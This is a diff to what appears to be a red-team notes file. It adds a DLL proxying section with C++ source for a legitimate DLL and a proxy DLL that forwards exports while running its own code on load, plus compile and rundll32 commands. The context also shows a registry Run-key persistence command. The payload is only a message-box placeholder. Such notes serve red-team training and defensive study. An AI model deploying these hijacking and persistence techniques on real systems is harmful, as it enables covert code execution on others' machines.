@@ -52,6 +52,97 @@ REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Run /v test /d "C:\
 C:\Users\Hassan.saad\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 ```
 
+### DLL Proxying
+
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/HostEnumeration/Screen2.png?raw=true)
+
+Create legitimate.cpp file.
+
+```
+#include "pch.h"
+​
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+​
+extern "C" __declspec(dllexport) VOID exportedFunction1(int a)
+{
+    MessageBoxA(NULL, "Hi from legitimate exportedFunction1", "Hi from legitimate exportedFunction1", 0);
+}
+​
+extern "C" __declspec(dllexport) VOID exportedFunction2(int a)
+{
+    MessageBoxA(NULL, "Hi from legitimate exportedFunction2", "Hi from legitimate exportedFunction2", 0);
+}
+​
+extern "C" __declspec(dllexport) VOID exportedFunction3(int a)
+{
+    MessageBoxA(NULL, "Hi from legitimate exportedFunction3", "Hi from legitimate exportedFunction3", 0);
+}
+```
+
+```
+# Compile
+"c:\Program Files\CodeBlocks\MinGW\bin\g++.exe" -shared c:\legitimate.cpp -o c:\legitimate.dll
+​
+# Execute
+rundll32 c:\legitimate.dll,exportedFunction1
+```
+
+Create malicious DLL to redirect the execution to the legitimate DLL.
+
+```
+#include "pch.h"
+​
+// Redirect the execution to the legitimate DLL
+#pragma comment(linker, "/export:exportedFunction1=legitimate.exportedFunction1")
+#pragma comment(linker, "/export:exportedFunction2=legitimate.exportedFunction2")
+#pragma comment(linker, "/export:exportedFunction3=legitimate.exportedFunction3")
+​
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    {
+        // Insert your malicious code here
+        MessageBoxA(NULL, "Hi from malicious dll", "Hi from malicious dll", 0);
+    }
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+```
+
+```
+# Compile
+"c:\Program Files\CodeBlocks\MinGW\bin\g++.exe" -shared c:\malicious.cpp -o c:\malicious.dll
+
+# Execute
+rundll32 c:\malicious.dll,exportedFunction1
+```
+
+Now when the call comes to malicious.dll it will forward this call to legitimate.dll
+
 ## Collecting Credentials
 
 ### Memory Credentials Dump
